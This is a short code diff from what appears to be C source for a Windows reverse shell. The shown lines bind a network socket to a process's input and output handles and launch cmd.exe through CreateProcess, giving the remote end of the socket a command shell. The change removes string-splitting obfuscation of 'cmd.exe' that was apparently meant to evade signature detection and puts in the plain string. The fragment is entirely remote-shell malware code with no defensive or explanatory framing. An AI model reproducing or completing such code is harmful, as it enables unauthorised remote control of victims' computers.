@@ -48,11 +48,8 @@ int main(int argc, char *argv[])
   theProcess.dwFlags=STARTF_USESTDHANDLES;
   theProcess.hStdInput = theProcess.hStdOutput = theProcess.hStdError = (HANDLE)Winsocket;
 
-  char *myArray[4] = { "cm", "d.e", "x", "e" };
-  char command[8] = "";
-  snprintf( command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);
 
-  CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &theProcess, &info_proc);
+  CreateProcess(NULL,"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &theProcess, &info_proc);
   
  
   }
